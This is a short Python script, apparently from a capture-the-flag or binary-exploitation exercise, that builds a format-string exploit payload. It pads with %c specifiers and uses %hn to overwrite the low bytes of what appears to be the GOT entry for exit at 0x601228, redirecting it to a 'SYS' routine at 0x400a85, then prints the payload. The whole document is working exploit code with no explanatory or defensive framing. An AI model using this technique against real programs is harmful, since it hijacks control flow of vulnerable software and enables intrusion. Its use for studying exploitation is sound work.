import struct

# We just interested in writing the 4 last bytes: 0a85
SYS = 0x00400a85
EXIT = 0x601228

format_string = "%c" * 6 + "%2687c" + "%hn" + "A" * 78
packed_exit_address = struct.pack("Q", EXIT)
exploit = format_string + packed_exit_address
print(exploit)